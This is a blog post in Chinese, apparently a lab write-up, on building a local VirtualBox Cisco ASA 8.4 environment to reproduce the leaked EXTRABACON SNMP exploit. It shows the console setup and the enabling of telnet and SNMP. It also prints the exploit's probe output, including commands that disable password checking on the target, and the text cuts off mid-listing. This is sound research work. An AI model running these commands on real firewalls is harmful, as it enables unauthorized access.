@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Cisco ASA RCE 环境搭建 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章http://www.freebuf.com/vuls/112589.html">
+<meta name="keywords" content="环境搭建">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cisco ASA RCE 环境搭建">
+<meta property="og:url" content="http://0x48.pw/2016/08/31/0x21/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章http://www.freebuf.com/vuls/112589.html">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/cisco1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/cisco2.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/cisco3.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/cisco4.png">
+<meta property="og:updated_time" content="2016-09-05T04:36:05.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cisco ASA RCE 环境搭建">
+<meta name="twitter:description" content="这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章http://www.freebuf.com/vuls/112589.html">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/cisco1.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x21" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/31/0x21/" class="article-date">
+      <time datetime="2016-08-31T14:56:11.000Z" itemprop="datePublished">2016-08-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Cisco ASA RCE 环境搭建
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/环境搭建/">环境搭建</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这几天在研究方程式泄露的EXTRABACON（EXBA）PoC, 网上没找到能成功的远程, 所以准备自己本地搭环境, 然后看到了这篇文章<a href="http://www.freebuf.com/vuls/112589.html" target="_blank" rel="external">http://www.freebuf.com/vuls/112589.html</a> </p>
+<a id="more"></a>
+<p>这篇文章是在方程式信息泄露后看过的对我最有帮助的文章了, 不过尴尬的是, 文章中复现环境是Windows下使用VM， 可是我的环境却是Linux+VBox</p>
+<p>表示我的Windows都是用来打游戏的, 啥工具都没有, 仔细看了下文章, 准备去搜搜Linux+VBox的解决方案</p>
+<p>首先是虚拟机镜像文件这些东西: <a href="http://l.0x48.pw/blackhat/ASA-8.4.zip" target="_blank" rel="external">http://l.0x48.pw/blackhat/ASA-8.4.zip</a></p>
+<p>解压出来， 里面有个<code>ASA-8.4.ovf</code>, 可直接用VBox的import applicace导入虚拟机</p>
+<p>讲道理, 应该导入后就可以使用了, 但是没人跟你讲道理, 所以接下来要做两件事, 或者可以说是一件事 —— 配网络, 配网络就需要使用Serial口连进去.</p>
+<h2 id="连接Serial口"><a href="#连接Serial口" class="headerlink" title="连接Serial口"></a>连接Serial口</h2><p>如下图所示:<br><img src="http://qn.lazysheep.cc/img/cisco1.png" alt="cisco1"></p>
+<p>基本默认就好, 重要的是<code>Path/Address: /tmp/gns3_vbox/5d5928d1-3cb9-46c6-85cb-b7e1121f188c</code></p>
+<p>这个地址自己填一个, 要写到VBox可写目录, 所以选择了/tmp</p>
+<p>然后在Ubuntu下连接Serial口的工具我选择了<code>minicom</code>:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt install minicom</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/minicom/minirc.dfl</span></div><div class="line">pu port			unix#/tmp/gns3_vbox/5d5928d1-3cb9-46c6-85cb-b7e1121f188c</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash">后面跟的路径就是上面VBox的那个路径</span></div></pre></td></tr></table></figure></p>
+<p>然后就是启动虚拟机了, 不过在启动之前还有几个问题</p>
+<p>如图:<br><img src="http://qn.lazysheep.cc/img/cisco2.png" alt="cisco2"></p>
+<p>更大的那块硬盘要作为Master, 要设置成启动盘, 虚拟机导入后是500kb的那块是启动盘, 所以启动不起来</p>
+<p>然后是网络, 自己测试就开一块网卡就够了, 然后我使用only-host, 如图:<br><img src="http://qn.lazysheep.cc/img/cisco3.png" alt="cisco3"></p>
+<p><img src="http://qn.lazysheep.cc/img/cisco4.png" alt="cisco4"></p>
+<p>然后可以开机了</p>
+<p>开机后选择<code>ASA 8.42</code> 启动, 然后会停在<code>Booting the kernel</code>, 然后别等了, 你等再久也是这页面(我最开始摸索的时候傻傻的等了半小时), 现在就可以使用<code>minicom</code>去连接ASA的Serial口了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo minicom</span></div></pre></td></tr></table></figure>
+<p>然后等会就能进入防火墙的终端了<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ciscoasa&gt;en</div><div class="line">Password: </div><div class="line">ciscoasa#show run</div><div class="line"><span class="code">......</span></div><div class="line">interface GigabitEthernet0</div><div class="line"> shutdown</div><div class="line"> no nameif</div><div class="line"> no security-level</div><div class="line"> no ip address</div><div class="line">!</div><div class="line">......</div></pre></td></tr></table></figure></p>
+<p>查看配置会发现VBox的host-only配的DHCP对这防火墙并没有用, 所以只能配静态ip了</p>
+<p>因为上面VBox host-only的网卡我配的是<code>192.168.56.1</code>, 所以防火墙我配个<code>192.168.56.150</code></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">ciscoasa<span class="comment"># conf ter</span></div><div class="line">ciscoasa(config)<span class="comment"># </span></div><div class="line"></div><div class="line">***************************** NOTICE *****************************</div><div class="line"></div><div class="line">Help <span class="built_in">to</span> improve <span class="keyword">the</span> ASA <span class="built_in">platform</span> <span class="keyword">by</span> enabling anonymous reporting,</div><div class="line">which allows Cisco <span class="built_in">to</span> securely receive minimal error <span class="keyword">and</span> health</div><div class="line">information <span class="built_in">from</span> <span class="keyword">the</span> device. To learn more about this feature,</div><div class="line">please visit: <span class="keyword">http</span>://www.cisco.com/go/smartcall</div><div class="line"></div><div class="line">Would you like <span class="built_in">to</span> enable anonymous error reporting <span class="built_in">to</span> help improve</div><div class="line"><span class="keyword">the</span> product? [Y]es, [N]o, [A]sk later: y</div><div class="line"></div><div class="line">Enabling anonymous reporting.</div><div class="line">Adding <span class="string">"call-home reporting anonymous"</span> <span class="built_in">to</span> running configuration...</div><div class="line">Creating trustpoint <span class="string">"_SmartCallHome_ServerCA"</span> <span class="keyword">and</span> installing certificate...</div><div class="line"></div><div class="line">Trustpoint <span class="string">'_SmartCallHome_ServerCA'</span> is <span class="keyword">a</span> subordinate CA <span class="keyword">and</span> holds <span class="keyword">a</span> non self-s.</div><div class="line"></div><div class="line">Trustpoint CA certificate accepted.</div><div class="line"></div><div class="line">Please remember <span class="built_in">to</span> save your configuration.</div><div class="line"></div><div class="line">ciscoasa(config)<span class="comment"># int G0</span></div><div class="line">ciscoasa(config-<span class="keyword">if</span>)<span class="comment"># ip address 192.168.56.150 255.255.255.0</span></div><div class="line">ciscoasa(config-<span class="keyword">if</span>)<span class="comment"># nameif inside</span></div><div class="line">ciscoasa(config-<span class="keyword">if</span>)<span class="comment"># no shut</span></div><div class="line">ciscoasa(config-<span class="keyword">if</span>)<span class="comment"># exit</span></div><div class="line">ciscoasa(config)<span class="comment"># exit</span></div><div class="line">ciscoasa<span class="comment"># show run</span></div><div class="line">......</div><div class="line">interface GigabitEthernet0</div><div class="line"> nameif inside</div><div class="line"> security-level <span class="number">100</span></div><div class="line"> ip address <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></div><div class="line">......</div></pre></td></tr></table></figure>
+<p>配置ip成功, 然后试着ping<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ciscoasa# ping 192.168.56.1</div><div class="line">Type escape sequence to abort.</div><div class="line">Sending 5, 100-byte ICMP Echos to 192.168.56.1, timeout is 2 seconds:</div><div class="line">?????</div><div class="line"><span class="keyword">Success </span>rate is 0 percent (0/5)</div></pre></td></tr></table></figure></p>
+<p>是GG的, 需要重启下<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ciscoasa# copy <span class="built_in">running</span>-<span class="built_in">config</span> startup-<span class="built_in">config</span></div><div class="line"></div><div class="line">Source filename [<span class="built_in">running</span>-<span class="built_in">config</span>]? </div><div class="line">Cryptochecksum: <span class="number">7</span>ab821ac df1697e5 <span class="number">257673</span>c1 <span class="number">49832288</span> </div><div class="line"></div><div class="line"><span class="number">5670</span> bytes copied <span class="keyword">in</span> <span class="number">0.20</span> secs</div></pre></td></tr></table></figure></p>
+<p>然后可以断电重启了(或者有没有像Linux上/etc/init.d/networking restart的程序? 并不懂, 所以采取了简单明了的硬重启)</p>
+<p>然后ping本机查看网络是否通畅:<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ciscoasa&gt; ping 192.168.56.1</div><div class="line">Type escape sequence to abort.</div><div class="line">Sending 5, 100-byte ICMP Echos to 192.168.56.1, timeout is 2 seconds:</div><div class="line">!!!!!</div><div class="line"><span class="keyword">Success </span>rate is 100 percent (5/5), round-trip min/avg/max = 1/1/1 ms</div></pre></td></tr></table></figure></p>
+<p>接下来就是开服务了, 根据漏洞描述, 防火墙需要开启ssh/telnet 和 snmp服务, 通过snmp的漏洞让ssh/telnet不需要密码即可登陆, 默认情况下, 这些服务器都是关闭的, 需要我们手动开始</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 开启<span class="selector-tag">telnet</span>服务, 允许任何主机访问</div><div class="line"><span class="selector-tag">ciscoasa</span>(<span class="selector-tag">config</span>)# <span class="selector-tag">telnet</span> 0<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span> 0<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span> <span class="selector-tag">inside</span></div><div class="line"># 开始<span class="selector-tag">snmp</span>服务, 允许192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.1</span>主机访问</div><div class="line"><span class="selector-tag">ciscoasa</span>(<span class="selector-tag">config</span>)# <span class="selector-tag">snmp-server</span> <span class="selector-tag">host</span> <span class="selector-tag">inside</span> 192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.1</span> <span class="selector-tag">community</span> <span class="selector-tag">public</span></div></pre></td></tr></table></figure>
+<p>检查是否成功开启<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ nmap <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span> -p23 -Pn</div><div class="line"></div><div class="line">Starting Nmap <span class="number">7.01</span> ( https://nmap.org ) <span class="meta">at</span> <span class="number">2016</span>-<span class="number">09</span>-<span class="number">01</span> <span class="number">14</span>:<span class="number">34</span> CST</div><div class="line">Nmap scan report for <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span></div><div class="line">Host is <span class="meta">up</span> (<span class="number">0.</span>00024s latency).</div><div class="line">PORT   STATE SERVICE</div><div class="line"><span class="number">23</span>/tcp open  telnet</div><div class="line"></div><div class="line">Nmap done: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.05</span> seconds</div><div class="line"></div><div class="line">$ sudo nmap <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span> -p161 -sU</div><div class="line"></div><div class="line">Starting Nmap <span class="number">7.01</span> ( https://nmap.org ) <span class="meta">at</span> <span class="number">2016</span>-<span class="number">09</span>-<span class="number">01</span> <span class="number">14</span>:<span class="number">36</span> CST</div><div class="line">Nmap scan report for <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span></div><div class="line">Host is <span class="meta">up</span> (<span class="number">0.</span>00020s latency).</div><div class="line">PORT    STATE SERVICE</div><div class="line"><span class="number">161</span>/udp open  snmp</div><div class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">89</span>:2B:<span class="number">96</span> (Oracle VirtualBox virtual NIC)</div><div class="line"></div><div class="line">Nmap done: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.82</span> seconds</div></pre></td></tr></table></figure></p>
+<p>然后可以使用方程式泄露的PoC打打看:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">$ python extrabacon_1<span class="number">.1</span><span class="number">.0</span><span class="number">.1</span>.py info -t <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span> -c <span class="keyword">public</span></div><div class="line">WARNING: No route found <span class="keyword">for</span> IPv6 destination :: (no <span class="keyword">default</span> route?)</div><div class="line">Logging <span class="keyword">to</span> /EXPLOITS/EXBA/concernedparent</div><div class="line">[+] Executing:  extrabacon_1<span class="number">.1</span><span class="number">.0</span><span class="number">.1</span>.py info -t <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span> -c <span class="keyword">public</span></div><div class="line">[+] probing target via snmp</div><div class="line">[+] Connecting <span class="keyword">to</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.150</span>:<span class="number">161</span></div><div class="line">****************************************</div><div class="line">[+] response:</div><div class="line"><span class="meta">###[ SNMP ]###</span></div><div class="line">  version   = &lt;ASN1_INTEGER[<span class="number">1</span>L]&gt;</div><div class="line">  community = &lt;ASN1_STRING[<span class="comment">'public']&gt;</span></div><div class="line">  \PDU       \</div><div class="line">   |<span class="meta">###[ SNMPresponse ]###</span></div><div class="line">   |  id        = &lt;ASN1_INTEGER[<span class="number">0</span>L]&gt;</div><div class="line">   |  <span class="keyword">error</span>     = &lt;ASN1_INTEGER[<span class="number">0</span>L]&gt;</div><div class="line">   |  error_index= &lt;ASN1_INTEGER[<span class="number">0</span>L]&gt;</div><div class="line">   |  \varbindlist\</div><div class="line">   |   |<span class="meta">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID[<span class="comment">'.1.3.6.1.2.1.1.1.0']&gt;</span></div><div class="line">   |   |  value     = &lt;ASN1_STRING[<span class="comment">'Cisco Adaptive Security Appliance Version 8.4(2)']&gt;</span></div><div class="line">   |   |<span class="meta">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID[<span class="comment">'.1.3.6.1.2.1.1.3.0']&gt;</span></div><div class="line">   |   |  value     = &lt;ASN1_TIME_TICKS[<span class="number">93000</span>L]&gt;</div><div class="line">   |   |<span class="meta">###[ SNMPvarbind ]###</span></div><div class="line">   |   |  oid       = &lt;ASN1_OID[<span class="comment">'.1.3.6.1.2.1.1.5.0']&gt;</span></div><div class="line">   |   |  value     = &lt;ASN1_STRING[<span class="comment">'ciscoasa']&gt;</span></div><div class="line"></div><div class="line">[+] firewall uptime <span class="keyword">is</span> <span class="number">93000</span> time ticks, <span class="keyword">or</span> <span class="number">0</span>:<span class="number">15</span>:<span class="number">30</span></div><div class="line"></div><div class="line">[+] firewall name <span class="keyword">is</span> ciscoasa</div><div class="line"></div><div class="line">[+] target <span class="keyword">is</span> running asa842, which <span class="keyword">is</span> supported</div><div class="line">Data stored <span class="keyword">in</span> <span class="keyword">key</span> file  : asa842</div><div class="line">Data stored <span class="keyword">in</span> self.vinfo: ASA842</div><div class="line"></div><div class="line"><span class="keyword">To</span> check the <span class="keyword">key</span> file <span class="keyword">to</span> see <span class="keyword">if</span> it really contains what we<span class="comment">'re claiming:</span></div><div class="line"><span class="meta"># cat /EXPLOITS/EXBA/keys/dc9d0q.key</span></div><div class="line"></div><div class="line"><span class="keyword">To</span> disable password checking <span class="keyword">on</span> target:</div><div class="line"><span class="meta"># extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-disable</span></div><div class="line"></div><div class="line"><span class="keyword">To</span> enable password checking <span class="keyword">on</span> target:</div><div class="line"><span class="meta"># extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-enable</span></div></pre></td></tr></table></figure></p>
+<p>第一步是主机信息探测, 接下来就是攻击了, 他的作用是可以无需密码使用telnet/ssh 连接防火墙:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ telnet <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span></div><div class="line">Trying <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span>...</div><div class="line">Connected to <span class="number">192.168</span><span class="meta">.56</span><span class="meta">.150</span>.</div><div class="line">Escape character is <span class="string">'^]'</span>.</div><div class="line"></div><div class="line"></div><div class="line">User Access Verification</div><div class="line"><span class="symbol"></span></div><div class="line">Password: </div><div class="line"><span class="symbol">Password:</span> </div><div class="line"><span class="symbol">Password:</span> Connection closed by foreign host.</div></pre></td></tr></table></figure></p>
+<p>先看没攻击前, 是没法连上的</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div 